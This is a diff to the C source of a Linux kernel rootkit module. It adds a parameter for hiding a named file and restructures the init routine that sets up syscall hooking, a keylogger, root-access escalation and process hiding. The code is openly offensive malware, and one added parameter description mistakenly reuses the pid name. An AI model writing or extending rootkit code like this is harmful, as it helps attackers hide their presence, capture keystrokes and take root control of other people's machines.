@@ -10,6 +10,7 @@
 #include "hooking.h"
 #include "root_access.h"
 #include "hide_proc.h"
+#include "hide_file.h"
 
 // module documentation
 MODULE_LICENSE(DRIVER_LICENSE);
@@ -21,16 +22,44 @@ char *pid;
 module_param(pid, charp, S_IRUGO);
 MODULE_PARM_DESC(pid, "The pid of the process we wish to hide, as a string.");
 
-static int __init rootkit_init(void) {
-	init_hooking();
-	init_fops();
-	init_keylogger();
-	init_root_access();
-	init_hide_proc(pid);
+char *file_name;
+module_param(file_name, charp, S_IRUGO);
+MODULE_PARM_DESC(pid, "The name of the file we wish to hide, as a string.");
 
-	hook();
-	printk(KERN_INFO "[+] Module loaded, inside %s.\n", __FUNCTION__);
-	return 0;
+static int __init rootkit_init(void) {
+	int status;
+
+	init_hooking();
+
+	status = init_fops();
+	if (status) goto fops;
+	status = init_keylogger();
+	if (status) goto keylogger;
+	status = init_root_access();
+	if (status) goto root_access;
+
+	if (pid) {
+		status = init_hide_proc(pid);
+		if (status) goto hide_proc;
+	}
+
+	if (file_name) {
+		status = init_hide_file(file_name);
+		if (status) goto hide_file;
+	}
+
+	status = hook();
+	if (status) goto hook;
+
+	printk(KERN_INFO "[+] Module loading successful, inside %s.\n", __FUNCTION__);
+	return status;
+
+	hook:
+	hide_file:		exit_hooking();
+	hide_proc:
+	root_access:	exit_keylogger();
+	keylogger:		exit_fops();
+	fops:			return status;
 }
 
 static void __exit rootkit_exit(void) {
@@ -38,7 +67,6 @@ static void __exit rootkit_exit(void) {
 	exit_fops();
 	exit_keylogger();
 	printk(KERN_INFO "[-] Module unloaded, inside %s.\n", __FUNCTION__);
-	return;
 }
 
 module_init(rootkit_init);
